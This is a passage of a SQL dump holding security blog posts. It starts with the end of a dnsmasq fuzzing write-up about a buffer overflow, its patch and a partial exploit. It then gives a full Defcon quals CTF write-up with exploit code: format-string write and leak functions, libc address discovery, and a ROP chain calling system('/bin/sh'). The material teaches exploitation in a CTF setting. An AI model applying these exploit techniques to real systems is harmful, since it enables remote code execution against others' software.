iovec dhcp_packet;\r\n  char *dhcp_buff, *dhcp_buff2, *dhcp_buff3;\r\n  struct ping_result *ping_results;\r\n  FILE *lease_stream;\r\n  struct dhcp_bridge *bridges;\r\n#ifdef HAVE_DHCP6\r\n  int duid_len;\r\n  unsigned char *duid;\r\n  struct iovec outpacket;\r\n  int dhcp6fd, icmp6fd;\r\n#endif\r\n  /* DBus stuff */\r\n  /* void * here to avoid depending on dbus headers outside dbus.c */\r\n  void *dbus;\r\n#ifdef HAVE_DBUS\r\n  struct watch *watches;\r\n#endif\r\n\r\n  /* TFTP stuff */\r\n  struct tftp_transfer *tftp_trans, *tftp_done_trans;\r\n\r\n  /* utility string buffer, hold max sized IP address as string */\r\n  char *addrbuff;\r\n  char *addrbuff2; /* only allocated when OPT_EXTRALOG */\r\n} *daemon;\r\n\nI haven\'t measured how far into that structure you can write, but the total number of bytes we can write into the 1024-byte buffer is 1368 bytes, so somewhere in the realm of the first 300 bytes are at risk.\nThe reason we saw a \"null pointer dereference\" and also a \"write NUL byte to arbitrary memory\" are both because we overwrote variables from that structure that are used later.\nPatch\nThe patch is pretty straight forward: add 1 to namelen for the periods. There was a second version of the same vulnerability (forgotten period) in the 0x40 handler as well.\nBut..... I\'m concerned about the whole idea of building a string and tracking the length next to it. That\'s a dangerous design pattern, and the chances of regressing when modifying any of the name parsing is high.\nExploit so-far\nI started writing an exploit for it. Before I stopped, I basically found a way to brute-force build a string that would overwrite an arbitrary number of bytes by adding the right amount of padding and the right number of periods. That turned out to be a fairly difficult job, because there are various things you have to juggle (the padding at the front of the string and the size of the repeated field). It turns out, the maximum length you can get is 1368 bytes put into a 1024-byte buffer.\nYou can download it here.\n...why it never got famous\nI held this back throughout the blog because it\'s the sad part. :)\nIt turns out, since I was working from the git HEAD version, it was brand new code. After bissecting versions to figure out where the vulnerable code came from, I determined that it was present only in 2.73rc5 - 2.73rc7. After I reported it, the author rolled out 2.73rc8 with the fix.\nIt was disappointing, to say the least, but on the plus side the process was interesting enough to write about! :)\nConclusion\nSo to summarize everything...\n\nI modified dnsmasq to read packets from a file instead of the network, then used afl-fuzz to fuzz and crash it.\nI found a vulnerability that was recently introduced, when parsing \"\\xc0\\x0c\" names + using periods.\nI triaged the vulnerability, and started writing an exploit.\nDetermined that the vulnerability was in brand new code, so I gave up on the exploit and decided to write a blog instead.\n\nAnd who knows, maybe somebody will develop one for fun? If anybody does, I\'ll give them a month of Reddit Gold!!!! :)\n(I\'m kidding about using that as a motivator, but I\'ll really do it if anybody bothers :P)', '\'DNS\', \'Hacking\', \'Tools\'', 'https://blog.skullsecurity.org/2015/how-i-nearly-almost-saved-the-internet-starring-afl-fuzz-and-dnsmasq');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (10, 'Defcon quals: wwtw (a series of vulns)', 'Ron Bowes', '2015-6-9', 'Hey folks,\nThis is going to be my final (and somewhat late) writeup for the Defcon Qualification CTF. The level was called \"wibbly-wobbly-timey-wimey\", or \"wwtw\", and was a combination of a few things (at least the way I solved it): programming, reverse engineering, logic bugs, format-string vulnerabilities, some return-oriented programming (for my solution), and Dr. Who references!\nI\'m not going to spend much time on the theory of format-string vulnerabilities or return-oriented programming because I just covered them in babyecho and r0pbaby.\nAnd by the way, I\'ll be building the solution in Python as we go, because the first part was solved by one of my teammates, and he\'s a Python guy. As much as I hated working with Python (which has become my life lately), I didn\'t want to re-write the first part and it was too complex to do on the shell, so I sucked it up and used his code.\nYou can download the binary here, and you can get the exploit and other files involved on my github page.\n\n.in { color: #dc322f; font-weight: bold; }\nPart 1: The game\nThe first part\'s a bit of a game. I wasn\'t all that interested in solving it, so I patched it out (see the next section) and discovered that there was another challenge I could work on while my teammate solved the game. This is going to be a very brief overview of my teammate\'s solution.\nWhen you start wwtw, you will see this:\n\r\nYou(^V<>) must find your way to the TARDIS(T) by avoiding the angels(A).\r\nGo through the exits(E) to get to the next room and continue your search.\r\nBut, most importantly, don\'t blink!\r\n   012345678901234567890\r\n00        <\r\n01\r\n02  A\r\n03\r\n04            A\r\n05\r\n06                AA\r\n07    A        A\r\n08 A\r\n09\r\n10  A     A\r\n11                  A\r\n12                 A\r\n13\r\n14                    A\r\n15    A\r\n16 A   A              E\r\n17\r\n18                A\r\n19  A\r\nYour move (w,a,s,d,q):\r\n\nAfter a few seconds, it times out. The timeout can be patched out, if you want, but the timeouts are actually somewhat important in this level as we\'ll see later.\nYou can move around your character using the w,a,s,d keys, as indicated in the little message. Your goal is to reach the tardis - represented by a \'T\' - by going through the exits - represented by \'E\'s - and avoiding the angels - represented by \'A\'s. The angels will follow you when your back is turned. This stuff is, of course, a Dr. Who reference. :)\nThe solution to this was actually pretty straight forward: a greedy algorithm that makes the \"best\" move toward the exit to a square that isn\'t occupied by an angel works 9 times out of 10, so we stuck with that and re-ran it whenever we got stuck in a corner or along the wall.\nYou can see the code for it in the exploit. I\'m not going to dwell on that part any longer.\nPart 1b: skipping the game\nAs I said, I didn\'t want to deal with solving the game, I wanted to get to the good stuff (so to speak), so I \"fixed\" the game such that every move would appear to be a move to the exit (it would be possible to skip the game part entirely, but this was easy and worked well enough).\nThis took a little bit of trial and error, but I primarily used the failure message - \"Enjoy 1960...\" - to figure out where in the binary to look.\nIf you look at all the places that string is found (in IDA, use shift-f12 or just search for it), you\'ll find one that looks like this:\n\r\n.text:00002E14          lea     eax, (aEnjoy1960____0 - 5000h)[ebx] ; \"Enjoy 1960...\"\r\n\nIf you look back a little bit, you\'ll find that the only way to get to that line is for this conditional jump to occur:\n\r\n.text:00002DC0 83 7D F4 01                             cmp     [ebp+var_C], 1\r\n.text:00002DC4 75 48                                   jnz     short loc_2E0E\r\n\nIt\'s pretty easy to fix that, you can simply replace the jnz - 75 48 - with nops - 90 90. Here\'s a diff:\n\r\n--- a   2015-06-03 17:09:22.000000000 -0700\r\n+++ b   2015-06-03 17:09:44.000000000 -0700\r\n@@ -3635,7 +3635,8 @@\r\n     2db8:      e8 7f ed ff ff          call   1b3c <main+0x937>\r\n     2dbd:      89 45 f4                mov    %eax,-0xc(%ebp)\r\n     2dc0:      83 7d f4 01             cmpl   $0x1,-0xc(%ebp)\r\n-    2dc4:      75 48                   jne    2e0e <main+0x1c09>\r\n+    2dc4:      90                      nop\r\n+    2dc5:      90                      nop\r\n     2dc6:      8d 83 e0 00 00 00       lea    0xe0(%ebx),%eax\r\n     2dcc:      8b 00                   mov    (%eax),%eax\r\n     2dce:      83 f8 03                cmp    $0x3,%eax\r\n\nAside: Making the binary debug-able\nJust as a quick aside: this program is a PIE - position independent executable - which means the addresses you see in IDA are all relative to 0. But when you run the program, it\'s assigned a \"proper\" address, even if ASLR is off. I don\'t know if there\'s a canonical way to deal with that, but I personally use this little trick in addition to turning off ASLR:\n\nReplace the first instruction in the start() or main() function with \"\\xcc\" (software breakpoint) (and enough nop instructions to overwrite exactly one instruction)\nRun it in a debugger such as gdb\n(Optionally) use a .gdbinit file that automatically resumes execution when the breakpoint is hit\n\nHere\'s the first line of start() in wwtw:\n\r\n.text:00000A60 31 ED                                   xor     ebp, ebp\r\n\nSince it\'s a two byte instruction (\"\\x31\\xED\"), we open the binary in a hex editor and replace those two bytes with \"\\xcc\\x90\" (the \"\\x90\" being a nop instruction). If you try to execute it after that change, you should see this if you did it right:\n\r\n$ ./wwtw-blog\r\nTrace/breakpoint trap\r\n\nAnd with a debugger, you can continue execution after that breakpoint:\n\r\n$ gdb -q ./wwtw-blog\r\n(gdb) run\r\nStarting program: /home/ron/defcon-quals/wwtw/wwtw-blog\r\n\r\nProgram received signal SIGTRAP, Trace/breakpoint trap.\r\n0x56555a61 in ?? ()\r\n(gdb) cont\r\nContinuing.\r\nYou(^V<>) must find your way to the TARDIS(T) by avoiding the angels(A).\r\nGo through the exits(E) to get to the next room and continue your search.\r\n[...]\r\n\nYou can also use a gdbinit file:\n\r\n$ echo -e \'run\\ncont\' > gdbhax\r\n$ gdb -q -x ./gdbhax ./wwtw-blog\r\nProgram received signal SIGTRAP, Trace/breakpoint trap.\r\n0x56555a61 in ?? ()\r\nYou(^V<>) must find your way to the TARDIS(T) by avoiding the angels(A).\r\nGo through the exits(E) to get to the next room and continue your search.\r\nBut, most importantly, don\'t blink!\r\n[...]\r\n\nPart 2: Starting the ignition (by debugging)\nAfter you complete the fifth room and get to the Tardis, you\'re prompted for a key:\n\r\nTARDIS KEY: abcd\r\nWrong key!\r\nEnjoy 1960...\r\n$ bcd\r\n\nFunny story: I had initially nop\'d out the failure condition when I was trying to nop out the \"you\'ve been eaten by an angel\" code from earlier, so it actually took me awhile to even realize that this was a challenge. I had accidentally set it to - as I describe in the next section - accept any password. :)\nAnyway, one thing you\'ll notice is that when it prompts you for the key, you can type in multiple characters, but after it kicks you out it prints all but the first character on the commandline. That\'s interesting, because it means that it\'s only consuming one character at a time and is therefore vulnerability to a bunch of attacks. If you happen to guess a correct character, it consumes one more:\n\r\nTARDIS KEY: Uabcd\r\nWrong key!\r\nEnjoy 1960...\r\n$ bcd\r\n\n(Note that it consumed both the \"U\" and the \"a\" this time)\nBecause it\'s checking one character at a time, it\'s pretty easy to guess it one character at a time - 62 max tries per character (31 on average) and a 10-character string means it could be guessed in something like 600 - 1000 runs. But we can do better than that!\nI searched the source in IDA for the string \"TARDIS KEY:\" to get an idea of where to look for the code. You will find it at 0x00000ED1, which is in a fairly short function called from main(). In it, you\'ll see a call to both read() and getchar(). But more importantly, in the whole function, there\'s only one \"cmp\" instruction that takes two registers (as opposed to a register and an immediate value (ie, constant)):\n\r\n.text:00000F45 39 C2                                   cmp     edx, eax\r\n\nIf I had to take a wild guess, I\'d say that this function somehow verifies the password you type in using that comparison. And if we\'re lucky, it\'ll be a comparison between what we typed and what they expected to see (it doesn\'t always work out that way, but when it does, it\'s awesome).\nTo set a breakpoint, we need to know which address to break at. The easiest way to do that is to disable ASLR and just have a look at what address stuff loads to. It shouldn\'t change if ASLR is off.\nOn my machine, wwtw loads to 0x56555000, which means that comparison should be at 0x56555000 + 0x00000f45 = 0x56555f45. We can verify in gdb:\n\r\n(gdb) x/i 0x56555f45\r\n   0x56555f45:  cmp    edx,eax\r\n\nWe want to put a breakpoint there and print out both of those values to make sure that one is what we typed and the other isn\'t. I added the breakpoint to my gdbhax file because I know I\'m going to be using it over and over:\n\r\n$ cat gdbhax\r\nrun\r\nb *0x56555f45\r\ncont\r\n\nAnd run the process (punching in whatever you want for the five moves, since we\'ve already \"fixed\" the game):\n\r\n$ gdb -q -x ./gdbhax ./wwtw-blog\r\n[...]\r\nProgram received signal SIGTRAP, Trace/breakpoint trap.\r\n0x56555a61 in ?? ()\r\nBreakpoint 1 at 0x56555f45\r\nYou(^V<>) must find your way to the TARDIS(T) by avoiding the angels(A).\r\nGo through the exits(E) to get to the next room and continue your search.\r\nBut, most importantly, don\'t blink!\r\n\r\n[...]\r\n\r\nTARDIS KEY: a\r\n\r\nBreakpoint 1, 0x56555f45 in ?? ()\r\n(gdb)\r\n(gdb) print/c $edx\r\n$2 = 65 \'a\'\r\n(gdb) print/c $eax\r\n$3 = 85 \'U\'\r\n(gdb)\r\n\nIt\'s comparing the first character we typed (\"a\") to another character (\"U\"). Awesome! Now we know that at that comparison, the proper character is in $eax, so we can add that to our gdbhax file:\n\r\n$ cat gdbhax\r\nrun\r\nb *0x56555f45\r\n\r\ncont\r\n\r\nwhile 1\r\n  print/c $eax\r\n  cont\r\nend\r\n\nThat little script basically sets a breakpoint on the comparison, then each time it breaks it prints eax and continues execution.\nWhen you run it a second time, we start with \"U\" and then whatever other character so we can get the second character:\n\r\n$ gdb -q -x ./gdbhax ./wwtw-blog\r\n[...]\r\nTARDIS KEY: Ua\r\n\r\nBreakpoint 1, 0x56555f45 in ?? ()\r\n$1 = 85 \'U\'\r\n\r\nBreakpoint 1, 0x56555f45 in ?? ()\r\n$2 = 101 \'e\'\r\nWrong key!\r\n\nThen run it again with \"Ue\" at the start:\n\r\nBreakpoint 1, 0x56555f45 in ?? ()\r\n$1 = 85 \'U\'\r\n\r\nBreakpoint 1, 0x56555f45 in ?? ()\r\n$2 = 101 \'e\'\r\n\r\nBreakpoint 1, 0x56555f45 in ?? ()\r\n$3 = 83 \'S\'\r\n\n...and so on. Eventually, you\'ll get the key \"UeSlhCAGEp\". If you try it, you\'ll see it works:\n\r\nTARDIS KEY: UeSlhCAGEp\r\nWelcome to the TARDIS!\r\nYour options are:\r\n1. Turn on the console\r\n2. Leave the TARDIS\r\n\nPart 2b: Without brute force\nUsually in CTFs, if a password or key is English-looking text, it\'s probably hardcoded, and if it\'s random looking, it\'s generated. Since that key was obviously not English, it stands to reason that it\'s probably generated and therefore would not work against the real service. At this point, my teammate hadn\'t solved the \"game\" part yet, so I couldn\'t easily test against the real server. Instead, I decided to dig a bit deeper to see how the key was actually generated. Spoiler: it doesn\'t actually change, so this wound up being unnecessary. There\'s a reason I take a long time to solve these levels. :)\nAt the start of the function that references the \"TARDIS KEY:\" string (the function contains, but doesn\'t start at, address 0x00000ED1), you\'ll see this line:\n\r\n.text:00000EEF        lea     eax, (check_key - 5000h)[ebx]\r\n\nLater, that variable is read, one byte at a time:\n\r\n.text:00000EFA top_loop:                               ; CODE XREF: check_key+A4j\r\n.text:00000EFA                 mov     eax, [ebp+key_thing]\r\n.text:00000EFD                 movzx   eax, byte ptr [eax]\r\n.text:00000F00                 movsx   eax, al\r\n.text:00000F03                 and     eax, 7Fh\r\n.text:00000F06                 mov     [esp], eax      ; int\r\n.text:00000F09                 call    _isalnum\r\n\nAt each point, it reads the next byte, ANDs it with 0x7F (clearing the uppermost bit), and calls isalnum() on it to see if it\'s a letter or a number. If it\'s a valid letter or number, it\'s considered part of the key; if not, it\'s skipped.\nIt took me far too long to see what was going on: the function I called check_key() actually references itself and reads its own code! It reads the first dozen or so bytes from the function\'s binary and compares the alpha-numeric values to the key that was typed in.\nTo put it another way: if you look at the start of the function in a hex editor, you\'ll see:\n55 89 E5 53 83 EC 24 E8 DC FB FF FF 81 C3 3C 41...\nIf we AND each of these values by 0x7F and convert them to a character, we get:\n\r\n1.9.3-p392 :004 > \"55 89 E5 53 83 EC 24 E8 DC FB FF FF 81 C3 3C 41\".split(\" \").each do |i|\r\n1.9.3-p392 :005 >     puts (i.to_i(16) & 0x7F).chr\r\n1.9.3-p392 :006?>   end\r\nU\r\n\r\ne\r\nS\r\n\r\nl\r\n$\r\nh\r\n\\\r\n{\r\n\r\n\r\n\r\nC\r\n<\r\nA\r\n\nIf you exclude the values that aren\'t alphanumeric, you can see that the first 16 bytes becomes \"UeSlhCA\", which is the first part of the code to start the engine!\nSatisfied that it wasn\'t random, I moved on.\nAside: Why did they use the function as the key?\nJust a quick little note in case you\'re wondering why the function used itself to generate the password...\nWhen you set a software breakpoint (which is by far the most common type of breakpoint), behind the scenes the debugger replaces the instruction with a software breakpoint (\"\\xcc\"). After it breaks, the real instruction is briefly replaced so the program can continue.\nIf you break on the first line of the function, then instead of the first line of the function being \"\\x55\", which is \"pop ebp\", it\'s \"\\xCC\" and therefore the value will be wrong. In fact, putting a breakpoint anywhere in the first ~20 bytes of that function will cause your passcode to be wrong.\nI suspect that this was used as a subtle anti-debugging technique.\nPart 2c: Skipping the password check\nMuch like the game, I didn\'t want to have to deal with entering the password each time around, so I found the call that checks whether or not that password was valid:\n\r\n.text:0000125E                 test    eax, eax\r\n.text:00001260                 jz      short loc_129C\r\n.text:00001262                 lea     eax, (aWrongKey - 5000h)[ebx] ; \"Wrong key!\"\r\n\nAnd switched the jz (\"\\x74\\x3a\") to a jmp (\"\\xeb\\x3a\"). Once you\'ve done that, you can type whatever you want (including nothing) for the key.\nPart 3: Time travelling\nNow that you\'ve started the Tardis, there\'s another challenge: you can only turn on the console during certain times:\n\r\nWelcome to the TARDIS!\r\nYour options are:\r\n1. Turn on the console\r\n2. Leave the TARDIS\r\nSelection: 1\r\nAccess denied except between May 17 2015 23:59:40 GMT and May 18 2015 00:00:00 GMT\r\n\nLooking around in IDA, I see some odd stuff happening. For example, the program attempts to connect to localhost on a weird port and read some data from it! The function that does that is called sub_CB0() if you want to have a look. After it connects, it sets up an alarm() that calls sub_E08() every 2 seconds. In that function, it reads 4 bytes from the socket and stores them. Those 4 bytes turned out to be a timestamp.\nBasically, it has a little timeserver running on localhost that sends it the current time. If we can make it use a different server, we can provide a custom timestamp and bypass this check. But how?\nI played around quite a bit with this, but I didn\'t make any breakthroughs till I ran it in strace.\nTo run the program in strace, we no longer need the debugger, so we have to fix the first two bytes of start():\n\r\n.text:00000A60 31 ED                                   xor     ebp, ebp\r\n\nand run strace on it to see what\'s going on:\n\r\nsocket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 3\r\nsetsockopt(3, SOL_SOCKET, SO_RCVTIMEO, \"\\0\\0\\0\\0\\350\\3\\0\\0\", 8) = 0\r\nconnect(3, {sa_family=AF_INET, sin_port=htons(1234), sin_addr=inet_addr(\"127.0.0.1\")}, 16) = 0\r\nwrite(3, \"\\0\", 1)                       = 1\r\nread(3, 0xffffcd88, 4)                  = -1 ECONNREFUSED (Connection refused)\r\n[...]\r\n--- SIGALRM {si_signo=SIGALRM, si_code=SI_KERNEL, si_value={int=111, ptr=0x6f}} ---\r\nwrite(3, \"\\0\", 1)                       = 1\r\nread(3, 0xffffc6d8, 4)                  = -1 ECONNREFUSED (Connection refused)\r\nalarm(2)                                = 0\r\nsigreturn() (mask [])                   = 3\r\nread(0, 0x5655a0b0, 9)                  = ? ERESTARTSYS (To be restarted if SA_RESTART is set)\r\n[...]\r\n\nBasically, it makes the connection and gets a socket numbered 3. Every 2 seconds, it reads a timestamp from the socket. One of the first things I often do while working on CTF challenges is disable alarm() calls, but in this case it was actually needed! I suspected that this is another anti-debugging measure - to catch people who disabled alarm() - and therefore I should look for the vulnerability in the callback function.\nIt turns out there wasn\'t really that much code, but the vulnerability was somewhat subtle and I didn\'t notice until I ran it in strace and typed a bunch of \"A\"s:\n\r\nread(0, AAAAAAAAAAAAAAAAAAAAAAAA\r\n\"AAAAAAAAA\", 9)                 = 9\r\nwrite(1, \"Invalid\\n\", 8Invalid\r\n)                = 8\r\n[...]\r\n--- SIGALRM {si_signo=SIGALRM, si_code=SI_KERNEL, si_value={int=111, ptr=0x6f}} ---\r\nwrite(65, \"\\0\", 1)                      = -1 EBADF (Bad file descriptor)\r\nread(65, 0xffffc6d8, 4)                 = -1 EBADF (Bad file descriptor)\r\nalarm(2)                                = 0\r\n[...]\r\n\nWhen I put a bunch of \"A\"s into the prompt, it started reading from socket 65 (aka, 0x41 or \"A\") instead of from socket 3! There\'s an off-by-one vulnerability that allows you to change the socket identifier!\nIf you were to use \"AAAAAAAA\\0\", it would overwrite the socket with a NUL byte, and instead of reading from socket 3 or 65, it would read from socket 0 - stdin. The very same socket we\'re already sending data to!\nHere\'s the python code to exploit this:\n\r\nsys.stdout.write(\"01234567\\0\")\r\nsys.stdout.flush()\r\n\r\ntime.sleep(2) # Has to be at least 2\r\n\r\nsys.stdout.write(\"\\x6d\\x2b\\x59\\x55\")\r\nsys.stdout.flush()\r\n\nThat hex value is a timestamp during the prescribed time. When it reads that from stdin rather than from the socket it opened, it thinks the time is right and we can then activate the TARDIS!\nPart 3b: Skipping the timestamp check\nOnce again, in the interest of being able to test without waiting 2 seconds every time, we can disable the timestamp check altogether. To do that, we find the error message:\n\r\n.text:00001409  lea     eax, (aAccessDeniedEx - 5000h)[ebx] ; \"Access denied except between %s and %s\\\"...\r\n\n...and look backwards a little bit to find the jump that gets you there:\n\r\n.text:000013BE E8 45 FA FF FF      call    check_timestamp\r\n.text:000013C3 85 C0               test    eax, eax\r\n.text:000013C5 74 2F               jz      short loc_13F6\r\n.text:000013C7 8D 83 22 E1 FF FF   lea     eax, (aTheTardisConso - 5000h)[ebx] ; \"The TARDIS console is online!\"\r\n\nAnd make sure it never happens (by replacing \"\\x74\\x2F\" with \"\\x90\\x90\"). Now we can jump directly to pressing \"1\" to active the TARDIS and it\'ll come right online:\n\r\n$ ./wwtw-blog-nodebug\r\n[...]\r\nWelcome to the TARDIS!\r\nYour options are:\r\n1. Turn on the console\r\n2. Leave the TARDIS\r\nSelection: 1\r\nThe TARDIS console is online!Your options are:\r\n1. Turn on the console\r\n2. Leave the TARDIS\r\n3. Dematerialize\r\nSelection:\r\n\nPart 4: Getting the coordinates\nWhen we select option 3, we\'re prompted for coordinates:\n\r\nYour options are:\r\n1. Turn on the console\r\n2. Leave the TARDIS\r\n3. Dematerialize\r\nSelection: 3\r\nCoordinates: 1,2\r\n1.000000, 2.000000\r\nYou safely travel to coordinates 1,2\r\n\nIf you look at the function that contains the \"You safely travel...\" string, you\'ll see that one of three things can happen:\n\nIt prints \"Invalid coordinates\" if you put anything other than two numbers (as defined by strtof() returning with no error, which means we can put a number then text without being \"caught\")\nIt prints \"You safely travel to coordinates [...]\" if you put valid coordinates\nIt prints \"XXX is occupied by another TARDIS\" if some particular set of coordinates are entered\n\nThe \"XXX\" in the output is actually the coordinates the user typed, as a string, passed directly to printf(). And we remember why printf(user_string) is bad, right? (Hint: format string attacks)\nThe function to calculate the coordinates used a bunch of floating point math, which made me sad - I don\'t really know how to reverse floating point stuff, and I don\'t really want to learn in the middle of a level. Fortunately, I noticed that two global variables were used:\n\r\n.text:0000112B                 fld     ds:(dbl_3170 - 5000h)[ebx]\r\n[...]\r\n.text:00001153                 fld     ds:(dbl_3178 - 5000h)[ebx]\r\n\nAnd if you look at the variables, you\'ll see:\n\r\n.rodata:00003170 dbl_3170        dq 51.492137            ; DATA XREF: do_jump_EXPLOITME+104r\r\n.rodata:00003170                                         ; do_jump_EXPLOITME+11Ar\r\n.rodata:00003178 dbl_3178        dq -0.192878            ; DATA XREF: do_jump_EXPLOITME+12Cr\r\n.rodata:00003178                                         ; do_jump_EXPLOITME+13Er\r\n\nSo that\'s kind of a freebie. If we enter them, it works:\n\r\nYour options are:\r\n1. Turn on the console\r\n2. Leave the TARDIS\r\n3. Dematerialize\r\nSelection: 3\r\nCoordinates: 51.492137,-0.192878\r\n51.492137, -0.192878\r\nCoordinate 51.492137,-0.192878 is occupied by another TARDIS.  Materializing there would rip a hole in time and space. Choose again.\r\n\nAnd, to finish it off, let\'s verify that there is indeed a format-string vulnerability there:\n\r\nCoordinates: 51.492137,-0.192878 %x %x %x\r\n51.492137, -0.192878\r\nCoordinate 51.492137,-0.192878 58601366 4049befe ef0f16f4 is occupied by another TARDIS.  Materializing there would rip a hole in time and space. Choose again.\r\n\r\nCoordinates: 51.492137,-0.192878 %n\r\n51.492137, -0.192878\r\nSegmentation fault\r\n\nYup! :)\nPart 4b: Format string exploit\nI\'m not going to spend any time explaining what a format string vulnerability is. If you aren\'t familiar, check out my last blog.\nInstead, we\'re going to look at how I exploited this one. :)\nThe cool thing about this is, as you can see in the last example, if you enter \"collision\" coordinates (ie, the ones that trigger the format string vulnerability), the function doesn\'t actually return, it just prompts again. The function doesn\'t return until you enter valid-looking coordinates (like 1,1).\nThat\'s really handy, because it means we can exploit it over and over before letting it return. Instead of the crazy math we had to do in the earlier level, we can just write one byte at a time. And speaking of the last level, I actually solved this level before babyecho, so I didn\'t have the handy format-string generator that I wrote.\nwrite_byte()\nI wrote a function in python that will write a single byte to a chosen address:\n\r\ndef write_byte(addr, value):\r\n    s = \"51.492137,-0.192878 \" + struct.pack(\"<I\", addr)\r\n    s += \"%\" + str(value + 256 - 24) + \"x%20$n\\n\"\r\n\r\n    print s\r\n    sys.stdout.flush()\r\n    sys.stdin.readline()\r\n\nBasically, it uses the classic \"AAAA%NNx%MM$n\" string, which we saw a whole bunch in babyecho, where:\n\nAAAA = the address as a 4-byte string (which will be the address written to by the %n)\nNN = the number of bytes to waste to ensure that %n writes the proper value to AAAA (keeping in mind that the coordinates and address take up 24 bytes already)\nMM = the number of elements on the stack before the format string reads itself (we can figure that out by bruteforce then hardcode it)\n\nIf that doesn\'t make sense, read the last blog - this is exactly the same attack (except simpler, because we only have to write a single byte).\nleak()\nMeanwhile, my teammate wrote this function that, while ugly, can leak arbitrary memory addresses using \"%s\":\n\r\ndef leak(address):\r\n    print >> sys.stderr, \"*** Leak 0x%04x\" % address\r\n    s = \"51.492137,-0.192878 \" + struct.pack(\"<I\", address) + \" >>>%20$s<<<\"\r\n    s = \"    51.492137,-0.192878 >>>%24$s<<< \" + struct.pack(\"<IIII\", address, address, address, address)\r\n    #print >> sys.stderr, \"s\", repr(s)\r\n    print s\r\n    sys.stdout.flush()\r\n    sys.stdin.readline() # Echoed coordinates.\r\n    resp = sys.stdin.readline()\r\n    #print >> sys.stderr, \"resp\", repr(resp)\r\n    m = re.search(r\'>>>(.*)<<<\', resp, flags=re.DOTALL)\r\n    while m is None:\r\n        extra = sys.stdin.readline()\r\n        assert extra, repr(extra)\r\n        resp += extra\r\n        print >> sys.stderr, \"read again\", repr(resp)\r\n        m = re.search(r\'>>>(.*)<<<\', resp, flags=re.DOTALL)\r\n    assert m is not None, repr(resp)\r\n    resp = m.group(1)\r\n    if resp == \"\":\r\n        resp = \"\\0\"\r\n    return resp\r\n\nThen, exactly like the last blog, we use the vulnerability to leak a return address and frame pointer, then overwrite the return address with a chosen address, and thus obtain EIP control.\nGetting libc\'s base address\nNext, we needed an address to return to. This was a little tricky, since I wasn\'t able to steal a copy of their libc.so file (it\'s the only 32-bit level our team worked on) - that means I could easily exploit myself, because I have libc handy, but I couldn\'t exploit them. There\'s a \"pwntool\" module that can find base addresses given a memory leak, but it was too slow and the binary would time out before it finished (more on that later).\nSo, I used the format-string vulnerability and a bit of experience to get the base address of libc. We use %s in the format string to leak data from the PLT and get an address of anything in the libc binary - I chose to find printf() because it\'s the first one I could think of. That\'s at a static offset in the wwtw binary file (we already know the return address, since we leaked it off the stack, and that can be used to calculate where the PLT is).\nOnce I had that address, I worked my way backwards, reading the first bytes of each page (multiple of 0x1000) until I found an ELF header. Here\'s the code:\n\r\nbf = printf_addr - 0xc280\r\nwhile True:\r\n    print >> sys.stderr, \"Checking\", hex(bf), \" (printf - \", hex(printf_addr - bf), \")...\"\r\n    str = leak(bf)\r\n    print >> sys.stderr, hexify(str)\r\n    if(str[0:4] == \"\\x7FELF\"):\r\n        break\r\n\r\n    bf -= 0x1000\r\n\nI now had the relative offset of printf(), which means given the address of printf(), I can find the base address deterministically.\nGetting system()\'s address\nOnce I had the base address, I wanted to find the address of system(). I don\'t normally like using stuff I didn\'t write, because it\'s really hard to troubleshoot when there\'s a problem, but I couldn\'t find an easy way to do this by bruteforce, so I tried using pwntools (\'leak\' refers to the function shown earlier):\n\r\nd = dynelf.DynELF(leak, libc_base_REAL)\r\nsystem_addr = d.lookup(\"system\", \'libc\')\r\n\nOnce again, this was too slow and kept timing out. I looked at some options, like stealing the libc binary from memory by returning into the write() libc function (like I did in ropasaurusrex) or trying to make pwntools start where it left off after being disconnected, but none of it would work.\n(in retrospect, I probably could have silently re-connected/re-solved the first half of the level in the leak() function and just continued where I left off, but that didn\'t occur to me till now, like two weeks later)\nAfter fighting for far too long, I had a realization: maybe my home Internet connection just sucks. I uploaded the script to my server and it found the address on the first try (and solved the game portion like 10x faster).\nGetting \"/bin/sh\"\'s address\nAlthough I ended up with the address of system(), getting the address of \"/bin/sh\" from libc might be a bit tricky, so instead I simply put the string in my own input buffer - the same buffer that contains the format string - and calculated the offset from the leaked ebp value to that address. Since it was on the stack, it was always at a fixed offset from the saved ebp, which we had access to.\nI could easily have leaked libc until I found the offset to the string, but that\'s completely unnecessary.\nBuilding the ROP chain\nIn the end, I had the address of system() and the address of \"/bin/sh\" in my buffer. I used them to construct a really simple ROP chain, similar to the one used in r0pbaby (the difference is that, since we\'re on 32-bit for this level, we can pass the address of \"/bin/sh\" on the stack and don\'t have to worry about finding a gadget):\n\r\nwrite_byte(return_ptr+0, (system_addr >> 0) & 0x0FF)\r\nwrite_byte(return_ptr+1, (system_addr >> 8) & 0x0FF)\r\nwrite_byte(return_ptr+2, (system_addr >> 16) & 0x0FF)\r\nwrite_byte(return_ptr+3, (system_addr >> 24) & 0x0FF)\r\n\r\nwrite_byte(return_ptr+4, 0x5e)\r\nwrite_byte(return_ptr+5, 0x5e)\r\nwrite_byte(return_ptr+6, 0x5e)\r\nwrite_byte(return_ptr+7, 0x5e)\r\n\r\nsh_addr = buffer_addr + 200 + FUDGE\r\nwrite_byte(return_ptr+8,  (sh_addr >> 0) & 0x0FF)\r\nwrite_byte(return_ptr+9,  (sh_addr >> 8) & 0x0FF)\r\nwrite_byte(return_ptr+10, (sh_addr >> 16) & 0x0FF)\r\nwrite_byte(return_ptr+11, (sh_addr >> 24) & 0x0FF)\r\n\nBasically, I wrote the 4-byte address of system() over the actual return address in four separate printf() calls. Then I wrote 4 useless bytes (they don\'t really matter - they\'re system()\'s return address so I made them something distinct so I can recognize the crash after system() returns). Then I wrote the address of \"/bin/sh\" over the next 4 bytes (the first parameter to system()).\nOnce that was done, I sent \"good\" coordinates - 100000,100000 - which caused the function to return. Since the return address had been overwritten, it returned to system(\"/bin/sh\") and it was game over.\nConclusion\nI really liked this level because it was multiple parts.\nFirst, we had to solve a game by making some simple AI.\nSecond, we had to find the \"key\" by either reverse engineering or debugging.\nThird, we had to fix the timestamp using an off-by-one error.\nAnd finally, we had to use a format string vulnerability to get EIP control and win the level.\nOne interesting dynamic of this level was that there were anti-debugging features in this level. One was the timeout that had to be used for the off-by-one error, since people frequently remove calls to alarm(), and the other was using the first few bytes of a function for something meaningful to mess with software breakpoints.', '\'Defcon Quals 2015\'', 'https://blog.skullsecurity.org/2015/defcon-quals-wwtw-a-series-of-vulns');
